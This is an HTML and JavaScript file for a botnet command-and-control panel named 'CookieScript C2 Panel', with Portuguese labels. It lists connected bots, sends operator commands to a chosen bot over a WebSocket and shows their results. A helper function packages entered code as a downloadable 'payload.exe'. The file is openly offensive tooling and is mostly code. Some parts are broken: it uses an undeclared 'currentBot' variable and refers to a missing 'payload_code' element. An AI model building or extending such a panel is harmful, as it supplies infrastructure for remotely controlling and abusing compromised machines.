// c2_interface.html
<!DOCTYPE html>
<html>
<head>
    <title>CookieScript C2 Panel</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; }
        #commands { width: 100%; height: 200px; background: #1a1a1a; color: #0f0; }
        .bot-list { list-style: none; }
        .bot-item { cursor: pointer; padding: 5px; border-bottom: 1px solid #0f0; }
    </style>
</head>
<body>
    <h1>🍪 CookieScript C2 Panel</h1>
    
    <div id="bots">
        <h2>Bots Conectados</h2>
        <ul class="bot-list" id="bot-list"></ul>
    </div>
    
    <div id="control">
        <h2>Enviar Comando</h2>
        <textarea id="commands" placeholder="Comando CookieScript..."></textarea>
        <button onclick="sendCommand()">Executar</button>
    </div>
    
    <div id="results">
        <h2>Resultados</h2>
        <pre id="output"></pre>
    </div>
    
    <script>
        const ws = new WebSocket('ws://localhost:8765');
        const bots = new Map();
        
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            
            if (data.type === 'bot_connected') {
                addBot(data.bot_id);
            } else if (data.type === 'command_result') {
                document.getElementById('output').innerHTML += 
                    `[${data.bot_id}] > ${data.result}\n`;
            }
        };
        
        function addBot(botId) {
            const botList = document.getElementById('bot-list');
            const li = document.createElement('li');
            li.className = 'bot-item';
            li.textContent = botId;
            li.onclick = () => selectBot(botId);
            botList.appendChild(li);
            bots.set(botId, li);
        }
        
        function selectBot(botId) {
            currentBot = botId;
            document.getElementById('output').innerHTML += 
                `\n--- Conectado a ${botId} ---\n`;
        }
        
        function sendCommand() {
            const command = document.getElementById('commands').value;
            if (currentBot) {
                ws.send(JSON.stringify({
                    type: 'command',
                    bot_id: currentBot,
                    command: command
                }));
            }
        }
        
        // Interface para criar payloads
        function generatePayload() {
            const payload = `
                @system function inject() {
                    ${document.getElementById('payload_code').value}
                }
            `;
            // Download do payload
            const blob = new Blob([payload], {type: 'application/octet-stream'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'payload.exe';
            a.click();
        }
    </script>
</body>
</html>
